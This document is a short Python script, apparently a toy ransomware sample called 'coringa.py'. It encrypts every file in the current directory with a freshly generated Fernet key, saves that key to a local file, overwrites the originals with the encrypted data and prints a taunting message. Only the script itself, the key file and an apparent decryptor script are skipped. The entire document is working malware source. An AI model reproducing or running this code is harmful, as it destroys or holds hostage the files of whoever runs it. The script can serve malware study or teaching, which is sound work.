#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "coringa.py" or file == "thekey.key" or file == "descoringa.py":
        continue

    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
# wb stands for "write binary" mode
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    # rb stands for "read binary" mode
    with open(file, "rb") as thefile:
        contents = thefile.read()

    contents_encrypted = Fernet(key).encrypt(contents)
    
    # wb stands for "write binary" mode
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)    

print("Your files has been encrypted! D:")
